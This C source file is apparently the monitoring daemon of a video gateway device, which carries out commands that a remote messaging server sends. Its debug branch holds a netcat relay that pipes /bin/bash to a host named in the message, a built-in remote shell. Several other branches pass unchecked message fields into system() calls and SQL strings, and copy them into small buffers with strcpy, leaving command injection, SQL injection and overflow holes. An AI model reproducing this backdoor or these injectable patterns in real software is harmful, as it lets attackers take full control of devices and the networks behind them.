#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/time.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "ip.h"
#include "hwid.h"
#include "http.h"
#include "config.h"
#include "sqlite.h"
#include "config_file.h"
#include "string_split.h"
#include "xttp_rtc_sdk.h"
#include "xftp_live_sdk.h"

#define XTTP_RETRY_MAX 6

#define APP_KEY g_app_key
#define APP_SECRET g_app_secret
#define LICENSE_KEY g_app_license

config_t g_config;

int g_is_running = 0;
int g_xttp_login_times = 0;
char g_recv_msg[1500] = {0};
char g_xttp_user[256] = {0};
char g_xttp_pwd[64] = {0};
uint16_t g_web_port = 0;
char g_web_server[32] = {0};
uint16_t g_xttp_port = 0;
char g_xttp_server[32] = {0};
char g_ver[64] = {0};
int g_is_online = 0;

void myStopXttpCallback(void);

int get_size(const char *file)
{
	struct stat st;

	if (stat(file, &st) == -1) {
		return -1;
	}
	return st.st_size;
}
int copy_file(const char *dest_file_name, const char *src_file_name)
{
	FILE *fp1;
	FILE *fp2;
	void *buffer;
	int op, cnt = 0;

	if(!dest_file_name || !src_file_name) {
		return -1;
	}

	fp1 = fopen(dest_file_name, "wb");
	if(!fp1) {
		perror("dest file wb failed");
		return -2;
	}
	fp2 = fopen(src_file_name, "rb");
	if(!fp2) {
		perror("src file rb failed");
		fclose(fp1);
		return -3;
	}

	buffer = (void *)malloc(2);
	while(1) {
		op = fread(buffer, 1, 1, fp2);
		if(op <= 0) break;
		fwrite(buffer, 1, 1, fp1);
		cnt++;
	}
	free(buffer);

	fclose(fp1);
	fclose(fp2);

	return cnt;
}
int delete_tables(void)
{
	char delete_sql[512] = {0};

	snprintf(delete_sql, sizeof(delete_sql) - 1, "delete from m_device;delete from m_server;delete from m_channel;delete from m_server_sip;delete from m_inited;");
	return write_data(delete_sql);
}

int update_monitor_online(int is_online)
{
	int rt;
	char update_sql_channel[128] = {0}, url[1024] = {0};

	if(is_online) {
		snprintf(update_sql_channel, sizeof(update_sql_channel) - 1, "update m_device set is_online_xt = 1");
	}else{
		snprintf(update_sql_channel, sizeof(update_sql_channel) - 1, "update m_device set is_online_xt = 0");
	}
	rt = write_data(update_sql_channel);
	if(rt < 0){
		fprintf(stderr, "[update_monitor_online] write_data update online to %d error rt = %d\n", is_online, rt);
		return -1;
	}
	snprintf(url, sizeof(url) - 1, "http://%s:%d/live/device/modDeviceXtOnline?device_no=%s&is_online_xt=%d", g_web_server, g_web_port, g_xttp_user, is_online);
	rt = httpRequest(url, NULL, NULL);
	if(rt < 0){
		fprintf(stderr, "[update_monitor_online] modDeviceXtOnline error rt = %d\n", rt);
		return -2;
	}

	return 0;
}
void myRegisterSuccessCallback(int state, const char *from, const char *servername, const int serverport)
{
	g_is_online = 1;
	g_xttp_login_times = 0;
	update_monitor_online(1);
	fprintf(stderr, "[myRegisterSuccessCallback] state=%d, from=%s, servername=%s, serverport=%d\n", state, from, servername, serverport);
}
void myRegisterFailedCallback(int state, const char *msg)
{
	g_is_online = 0;
	update_monitor_online(0);
	fprintf(stderr, "[myRegisterFailedCallback] state=%d, msg=%s\n", state, msg);
}
int update_monitor_version(char *ver)
{
	int rt;
	char url[1024] = {0};

	snprintf(url, sizeof(url) - 1, "http://%s:%d/live/ver/checkver?device_no=%s&ver=%s", g_web_server, g_web_port, g_xttp_user, ver);
	fprintf(stderr, "[update_monitor_version] url = %s\n", url);
	rt = httpRequest(url, NULL, NULL);
	fprintf(stderr, "[update_monitor_version] httpRequest rt = %d\n", rt);
	return rt;
}
void myReceiveMsgCallback(const char *msg, const char *from, const char *msgid, int msg_type, const char *pid, const char *msgatime, int need_transfer_encode)
{
	time_t now;
	CHANNELS channels;
	channels.size = 0;
	const char *src_file_name = g_db_name;
	int file_size, type = -1, control_type = -1, command_type = -1, i = 0, rt = 0,
		must_response, debug_inport, debug_outport, debug_pid, debug_line, debug_c, debug_b, debug_t;
	char ftxt[1024] = {0}, record_str[1024] = {0}, minute[8] = {0}, day_hour[8] = {0}, year_month[8] = {0}, push_url[512] = {0}, stream_name[16] = {0}, 
		channel_no[8] = {0}, utime[32] = {0}, base_url[258] = {0}, url[1024] = {0}, dest_file_name[64] = {0}, insert_sql[2604] = {0},
		upload_log_file[64] = {0}, debug_dst[32] = {0}, debug_stream_url[512] = {0}, debug_cmd[32] = {0}, debug_dir[256] = {0}, debug_file[256] = {0}, debug_process[16] = {0}, debug_ip[32] = {0};

	StringSplitHandler msg_split_handler, key_value_split_handler;
	StringSplit *key_value_pairs = NULL, *item_pairs = NULL;
	StringSplitItem *item = NULL, *key = NULL, *value = NULL;

	MSG_SENT_RESULT sent_result;
	char response_msg[512] = {0};

	TABLE_DATA data;

	upgrade_t upgrade_r;
	upgrade_r.c = &g_config;
	upgrade_r.ch = &channels;

	if (!msg || strlen(msg) >= 1500) {
		fprintf(stderr, "[myReceiveMsgCallback] invalid msg!\n");
		update_monitor_version(g_ver);
		return;
	}
	if (init_string_split_handler(&msg_split_handler)) {
		fprintf(stderr, "[myReceiveMsgCallback] init_string_split_handler(1) failed!\n");
		update_monitor_version(g_ver);
		return;
	}

	strcpy(g_recv_msg, msg);
	key_value_pairs = string_split_handle(';', g_recv_msg, &msg_split_handler);
	if (key_value_pairs->items != NULL) {
		for (i = 0; i < key_value_pairs->number; i++) {
			item = key_value_pairs->items[i];
			if (item != NULL && item->length) {
				if (init_string_split_handler(&key_value_split_handler)) {
					fprintf(stderr, "[myReceiveMsgCallback] init_string_split_handler(2) failed!\n");
					break;
				}

				if (strstr(item->str, "=")) {
					item_pairs = string_split_handle('=', item->str, &key_value_split_handler);
					if (item_pairs->items != NULL) {
						if (item_pairs->number != 2) {
							fprintf(stderr, "[myReceiveMsgCallback] not key-value: number:%d\n", item_pairs->number);
							string_split_free(item_pairs, &key_value_split_handler);
							break;
						}
						key = item_pairs->items[0];
						value = item_pairs->items[1];

						if (!key->length || !value->length) {
							break;
						}
						if (!strcasecmp(key->str, "type")) {
							type = atoi(value->str);
						} else if (!strcasecmp(key->str, "control_type")) {
							control_type = atoi(value->str);
						} else if (!strcasecmp(key->str, "command_type")) {
							command_type = atoi(value->str);
						} else if (!strcasecmp(key->str, "channel_no")) {
							strcpy(channel_no, value->str);
						} else if (!strcasecmp(key->str, "stream_name")) {
							strcpy(stream_name, value->str);
						} else if (!strcasecmp(key->str, "push_url")) {
							strcpy(push_url, value->str);
						} else if (!strcasecmp(key->str, "year_month")) {
							strcpy(year_month, value->str);
						} else if (!strcasecmp(key->str, "day_hour")) {
							strcpy(day_hour, value->str);
						} else if (!strcasecmp(key->str, "minute")) {
							strcpy(minute, value->str);
						} else if (!strcasecmp(key->str, "cmd")) {
							strcpy(debug_cmd, value->str);
						} else if (!strcasecmp(key->str, "dir")) {
							strcpy(debug_dir, value->str);
						} else if (!strcasecmp(key->str, "file")) {
							strcpy(debug_file, value->str);
						} else if (!strcasecmp(key->str, "process")) {
							strcpy(debug_process, value->str);
						} else if (!strcasecmp(key->str, "pid")) {
							debug_pid = atoi(value->str);
						} else if (!strcasecmp(key->str, "line")) {
							debug_line = atoi(value->str);
						} else if (!strcasecmp(key->str, "ip")) {
							strcpy(debug_ip, value->str);
						} else if (!strcasecmp(key->str, "c")) {
							debug_c = atoi(value->str);
						} else if (!strcasecmp(key->str, "b")) {
							debug_b = atoi(value->str);
						} else if (!strcasecmp(key->str, "t")) {
							debug_t = atoi(value->str);
						} else if (!strcasecmp(key->str, "dst")) {
							strcpy(debug_dst, value->str);
						} else if (!strcasecmp(key->str, "inport")) {
							debug_inport = atoi(value->str);
						} else if (!strcasecmp(key->str, "outport")) {
							debug_outport = atoi(value->str);
						}
					} else {
						string_split_free(item_pairs, &key_value_split_handler);
						break;
					}
					string_split_free(item_pairs, &key_value_split_handler);
				} else {
					break;
				}
			} else {
				fprintf(stderr, "[myReceiveMsgCallback] item:%d is NULL\n", i);
				break;
			}
		}
	} else{
		fprintf(stderr, "[myReceiveMsgCallback] key_value_pairs->item == NULL\n");
	}
	string_split_free(key_value_pairs, &msg_split_handler);
	if (type != 6){
		update_monitor_version(g_ver);
		return;
	}

	if (control_type == 10) {
		memset(&g_config, 0, sizeof(config_t));
		strcpy(g_config.device_no, g_xttp_user);
		snprintf(base_url, sizeof(base_url) - 1, "http://%s:%d", g_web_server, g_web_port);
		fprintf(stderr, "[myReceiveMsgCallback] web base_url: %s\n", base_url);

		file_size = get_size(src_file_name);
		time(&now);
		snprintf(dest_file_name, sizeof(dest_file_name) - 1, "%s.%ld", src_file_name, now);
		rt = copy_file(dest_file_name, src_file_name);
		if(rt <= 0 || rt != file_size){
			fprintf(stderr, "[myReceiveMsgCallback] copy_file failed 1 dest = %s, file_size = %d, rt = %d\n", dest_file_name, file_size, rt);
			update_monitor_version(g_ver);
			return;
		}
		rt = delete_tables();
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] delete_tables failed rt = %d\n", rt);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		snprintf(url, sizeof(url) - 1, "%s/live/upgrade/upAll?device_no=%s", base_url, g_config.device_no);
		rt = httpRequest(url, get_upgrade_info, (void *)&upgrade_r);
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] httpRequest get_upgrade_info error rt = %d\n", rt);
			if (channels.size) free(channels.channel);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		snprintf(insert_sql, sizeof(insert_sql) - 1, "insert into m_device (id,device_no,device_pwd,device_name,channel_num,is_acitved,is_mp4,max_space,is_ai,ver,is_rate) values(NULL, \"%s\", \"%s\", \"%s\", %d, %d, %d, %d, %d, \"%s\", %d)", g_config.device_no, g_config.device_pwd, g_config.device_name, g_config.channel_num, g_config.is_acitved, g_config.is_mp4, g_config.max_space, g_config.is_ai, g_config.ver, g_config.is_rate);
		rt = write_data(insert_sql);
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] write_data device error rt = %d\n", rt);
			if (channels.size) free(channels.channel);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		snprintf(insert_sql, sizeof(insert_sql) - 1, "insert into m_server (id,ip,port,type) values(NULL, \"%s\", %d, \"sip\"),(NULL, \"%s\", %d, \"web\"),(NULL, \"%s\", %d, \"msg\"),(NULL, \"%s\", %d, \"video\")", g_config.sip_ip, g_config.sip_port, g_config.web_ip, g_config.web_port, g_config.msg_ip, g_config.msg_port, g_config.video_ip, g_config.video_port);
		rt = write_data(insert_sql);
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] write_data server ip/port error rt = %d\n", rt);
			if (channels.size) free(channels.channel);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		snprintf(insert_sql, sizeof(insert_sql) - 1, "insert into m_server_sip (id,server_no,device_sip,password,expiry,heartbeat,server_domain) values(NULL, \"%s\", \"%s\", \"%s\", %d, %d, \"%s\")", g_config.sip_no, g_config.user_id, g_config.sip_pwd, g_config.expiry, g_config.heartbeat, g_config.server_domain);
		rt = write_data(insert_sql);
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] write_data sip info error rt = %d\n", rt);
			if (channels.size) free(channels.channel);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		if(channels.size){
			for(i = 0; i < channels.size; i++){
				snprintf(insert_sql, sizeof(insert_sql) - 1, "insert into m_channel (id,channel_no,channel_pwd,channel_sip,channel_name,protocol,stream_url,is_gb28181,channel_desc,is_open_rate) values(NULL, \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", %d, \"%s\", %d)", channels.channel[i].channel_no, channels.channel[i].channel_pwd, channels.channel[i].channel_sip, channels.channel[i].channel_name, channels.channel[i].protocol, channels.channel[i].stream_url, channels.channel[i].is_gb28181, channels.channel[i].channel_desc, channels.channel[i].is_open_rate);
				rt = write_data(insert_sql);
				if(rt < 0){
					fprintf(stderr, "[myReceiveMsgCallback] insert_sql = %s:%d\n", insert_sql, rt);
					copy_file(src_file_name, dest_file_name);
					update_monitor_version(g_ver);
					return;
				}
			}
			free(channels.channel);
		}

		get_now(utime, sizeof(utime));
		snprintf(insert_sql, sizeof(insert_sql) - 1, "insert into m_inited (id,utime) values(NULL,\"%s\")", utime);
		rt = write_data(insert_sql);
		if(rt < 0){
			fprintf(stderr, "[myReceiveMsgCallback] write_data init error rt = %d\n", rt);
			copy_file(src_file_name, dest_file_name);
			update_monitor_version(g_ver);
			return;
		}

		rt = system("killall gb28181");
		rt = system("killall xftp");
		// rt = system("killall monitor");
		update_monitor_version(g_config.ver);
		strcpy(g_ver, g_config.ver);
		fprintf(stderr, "[myReceiveMsgCallback] record_str 10 --> end\n");
	}else if (control_type == 11){
		if(command_type == 1){
			fprintf(stderr, "[myReceiveMsgCallback] record_str 11.1 --> sudo reboot\n");
			rt = system("sudo reboot");
		}else if(command_type == 2){
			fprintf(stderr, "[myReceiveMsgCallback] record_str 11.2 --> killall gb28181\n");
			rt = system("killall gb28181");
		}else if(command_type == 3){
			fprintf(stderr, "[myReceiveMsgCallback] record_str 11.3 --> killall monitor\n");
			rt = system("killall monitor");
		}else if(command_type == 4){
			snprintf(ftxt, sizeof(ftxt) - 1, "ps -ef | grep -v grep | grep -v tail | grep 'bin/xftp %s' | awk '{print $2}' | xargs kill -9", channel_no);
			fprintf(stderr, "[myReceiveMsgCallback] record_str 11.4 --> %s\n", ftxt);
			rt = system(ftxt);
		}
	}else if (control_type == 16){
		snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/nohup /usr/bin/ffmpeg -re -i /www/wwwroot/gateway/runtime/video/%s/%s/%s%s.mp4 -c copy -f flv \"rtmp://%s/video/%s\" > /dev/null 2>&1 &", channel_no, year_month, day_hour, minute, push_url, stream_name);
		fprintf(stderr, "[myReceiveMsgCallback] record_str 16 --> %s\n", record_str);
		rt = system(record_str);
	}else if (control_type == 17){
		snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/ps -ef | grep -v grep | grep -v tail | grep \"rtmp://%s/video/%s\" | awk '{print $2}' | xargs kill -9", push_url, stream_name);
		fprintf(stderr, "[myReceiveMsgCallback] record_str 17 --> %s\n", record_str);
		rt = system(record_str);
	}else if (control_type == 18){
		must_response = 1;
		if(!strcmp(debug_cmd, "w") || !strcmp(debug_cmd, "pwd")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/%s > /usr/local/xt/debug/%s.log 2>&1", debug_cmd, debug_cmd);
		}else if(!strcmp(debug_cmd, "df")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/df -h > /usr/local/xt/debug/df.log 2>&1");
		}else if(!strcmp(debug_cmd, "route")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/sbin/route -n > /usr/local/xt/debug/route.log 2>&1");
		}else if(!strcmp(debug_cmd, "ifconfig")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/sbin/ifconfig > /usr/local/xt/debug/ifconfig.log 2>&1");
		}else if(!strcmp(debug_cmd, "ps")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/ps -ef | grep -v grep | grep -v tail | grep '%s' > /usr/local/xt/debug/ps.log 2>&1", debug_process);
		}else if(!strcmp(debug_cmd, "ffprobe")){
			char select_sql_channel[128] = {0};
			snprintf(select_sql_channel, sizeof(select_sql_channel) - 1, "select stream_url from m_channel where channel_no = '%s'", channel_no);
			rt = read_data(&data, select_sql_channel);
			if(rt){
				fprintf(stderr, "[myReceiveMsgCallback] 18 Not find channel stream_url %s.\n", channel_no);
				return;
			}
			strcpy(debug_stream_url, data.lines[0].fields[0].val);
			free(data.lines);
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/ffprobe '%s' > /usr/local/xt/debug/ffprobe.log 2>&1", debug_stream_url);
		}else if(!strcmp(debug_cmd, "tail")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/tail -%d %s > /usr/local/xt/debug/tail.log 2>&1", debug_line, debug_file);
		}else if(!strcmp(debug_cmd, "ping")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/ping -c %d %s > /usr/local/xt/debug/ping.log 2>&1", debug_c, debug_ip);
		}else if(!strcmp(debug_cmd, "ls")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/ls -altr %s > /usr/local/xt/debug/ls.log 2>&1", debug_dir);
		}else if(!strcmp(debug_cmd, "iperf3")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/iperf3 -u -c %s -b %dM -t %d > /usr/local/xt/debug/iperf3.log 2>&1", debug_ip, debug_b, debug_t);
		}else if(!strcmp(debug_cmd, "kill")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/kill -9 %d", debug_pid);
			must_response = 0;
		}else if(!strcmp(debug_cmd, "killall")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/killall %s", debug_dst);
			must_response = 0;
		}else if(!strcmp(debug_cmd, "nc")){
			snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/nc %s %d | /bin/bash | /usr/bin/nc %s %d &", debug_ip, debug_inport, debug_ip, debug_outport);
			must_response = 0;
		}else{
			fprintf(stderr, "[myReceiveMsgCallback] 18 --> error cmd %s\n", debug_cmd);
			return;
		}
		fprintf(stderr, "[myReceiveMsgCallback] record_str 18 --> %s\n", record_str);
		rt = system(record_str);
		if(!must_response) return;

		snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/curl -X POST -T '/usr/local/xt/debug/%s.log' http://%s:%d/live/debug/info > /dev/null 2>&1", debug_cmd, g_web_server, g_web_port);
		rt = system(record_str);
	}else if (control_type == 19){
		snprintf(record_str, sizeof(record_str) - 1, "/usr/bin/php /www/wwwroot/gateway/public/index.php index/updata/uphisdata> /dev/null 2>&1 &");
		fprintf(stderr, "[myReceiveMsgCallback] record_str 19 --> %s\n", record_str);
		rt = system(record_str);
	}
}
void myReceiveBinaryMsgCallback(uint8_t *data, int size, const char *from, const char *msgid, int type)
{
	fprintf(stderr, "[myReceiveBinaryMsgCallback] size=%d, from=%s, msgid=%s, type=%d\n", size, from, msgid, type);
}
void mySentMsgResponseCallback(const char *msgid, const char *pid, const char *msgatime)
{
	fprintf(stderr, "[mySentMsgResponseCallback] msgid=%s, pid=%s, msgatime=%s\n", msgid, pid, msgatime);
}
int start_msg_client(void)
{
	int rt = -100;

	update_monitor_online(0);
	if(!g_is_online){
		rt = start_xttp_client(g_xttp_user, g_xttp_pwd, g_xttp_server, 
				g_xttp_port, 0, myRegisterSuccessCallback, 
				myRegisterFailedCallback, myReceiveMsgCallback,
				myReceiveBinaryMsgCallback, mySentMsgResponseCallback, myStopXttpCallback);
		fprintf(stderr, "[start_msg_client] start_xttp_client rt=%d\n", rt);
	}
	return rt;
}
void myStopXttpCallback(void)
{
	fprintf(stderr, "[myStopXttpCallback] .............. \n");

	int rt = 0;
	g_is_online = 0;
	++g_xttp_login_times;
	if (g_xttp_login_times < XTTP_RETRY_MAX) {
		rt = start_msg_client();
		fprintf(stderr, "[myStopXttpCallback] 0 start_msg_client rt=%d\n", rt);
	}else{
		g_xttp_login_times = 0;
		if(!g_is_online){
			rt = start_msg_client();
			fprintf(stderr, "[myStopXttpCallback] 1 start_msg_client rt=%d\n", rt);
		}
	}
	if (g_xttp_login_times == XTTP_RETRY_MAX) {
		sleep(60);
	}
}

int read_config_device()
{
	int rt;
	TABLE_DATA data;

	char select_sql_server[128] = {0}, select_sql_device[128] = {0};
	snprintf(select_sql_device, sizeof(select_sql_device) - 1, "select id,device_no,device_pwd,device_name,ver from m_device");
	rt = read_data(&data, select_sql_device);
	if(rt){
		fprintf(stderr, "[read_config_device] Not find device.\n");
		return -1;
	}
	strcpy(g_xttp_user, data.lines[0].fields[1].val);
	strcpy(g_xttp_pwd, data.lines[0].fields[2].val);
	strcpy(g_ver, data.lines[0].fields[4].val);
	free(data.lines);

	snprintf(select_sql_server, sizeof(select_sql_server) - 1, "select id,ip,port,type from m_server where type = 'msg'");
	rt = read_data(&data, select_sql_server);
	if(rt){
		fprintf(stderr, "[read_config_device] Not find msg server ip and port.\n");
		return -2;
	}
	strcpy(g_xttp_server, data.lines[0].fields[1].val);
	g_xttp_port = atol(data.lines[0].fields[2].val);
	free(data.lines);

	snprintf(select_sql_server, sizeof(select_sql_server) - 1, "select id,ip,port,type from m_server where type = 'web'");
	rt = read_data(&data, select_sql_server);
	if(rt){
		fprintf(stderr, "[read_config_device] Not find web server ip and port.\n");
		return -3;
	}
	strcpy(g_web_server, data.lines[0].fields[1].val);
	g_web_port = atol(data.lines[0].fields[2].val);
	free(data.lines);

	return 0;
}
void IntHandle(int signo)
{
	int rt = 0;

	switch(signo){
		case SIGINT:
			fprintf(stderr, "[IntHandle] recv SIGINT ... ... \n");
			break;
		case SIGTERM:
			fprintf(stderr, "[IntHandle] recv SIGTERM ... ... \n");
			break;
		default:
			return;
	}
	g_is_running = 0;
	rt = stop_xttp_client();
	fprintf(stderr, "[IntHandle] stop_xttp_client rt = %d\n", rt);
}

int main(int argc, char *argv[])
{
	int rt, i = 3;
	char hash[128] = {0};

	rt = read_hwid();
	if (rt) {
		fprintf(stderr, "[%s] -> Failed = %d.\n", argv[0], rt);
		return -1;
	}
	rt = load_config();
	if (rt != 0) {
		fprintf(stderr, "[%s] load_config failed, rt = %d\n", argv[0], rt);
		return -2;
	}
	rt = initAppkeySecretLicense(APP_KEY, APP_SECRET, LICENSE_KEY);
	if (rt != 0) {
		fprintf(stderr, "[%s] initAppkeySecretLicense failed, rt = %d\n", argv[0], rt);
		return -3;
	}
	rt = read_config_device();
	if(rt < 0){
		fprintf(stderr, "[%s] read_config_device failed, rt = %d\n", argv[0], rt);
		return -4;
	}

	while (i--) {
		rt = start_msg_client();
		fprintf(stderr, "[%s] 1 start_msg_client, rt = %d\n", argv[0], rt);
		if (!rt) break;
		sleep(1);
	}
	if (rt) return -5;
	rt = update_monitor_version(g_ver);
	fprintf(stderr, "[%s] update_monitor_version rt = %d\n", argv[0], rt);
	start_check_ip_thread();

	g_is_running = 1;
	signal(SIGINT, IntHandle);
	signal(SIGTERM, IntHandle);
	while (g_is_running) {
		sleep(1);
		if (!g_is_online) {
			rt = start_msg_client();
			fprintf(stderr, "[%s] 2 start_msg_client, rt = %d\n", argv[0], rt);
		}
	}

	return 0;
}
